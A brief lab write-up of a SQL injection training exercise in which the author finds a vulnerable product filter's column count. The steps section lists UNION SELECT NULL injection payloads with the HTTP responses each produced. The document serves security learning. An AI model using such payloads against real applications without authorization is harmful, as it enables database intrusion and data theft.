# Lab: SQL injection UNION attack, determining the number of columns returned by the query

**Category:** SQL Injection  
**Difficulty:** Practitioner

## Vulnerability

Product category filter is vulnerable to SQL injection. Results are returned in the response, enabling UNION-based attacks. First step is to determine the number of columns.

## Steps I Followed

1. Captured category filter request in Burp Repeater
2. Tested: `' UNION SELECT NULL--` → 500
3. Tested: `' UNION SELECT NULL,NULL--` → 500
4. Tested: `' UNION SELECT NULL,NULL,NULL--` → 200
5. Lab solved

## Why it worked

The original query returns 3 columns. UNION requires the same number of columns. When the column count matched, the extra row with NULL values was accepted.

## Understanding

Always determine column count first before building a full UNION attack. Use NULL to avoid data type issues.
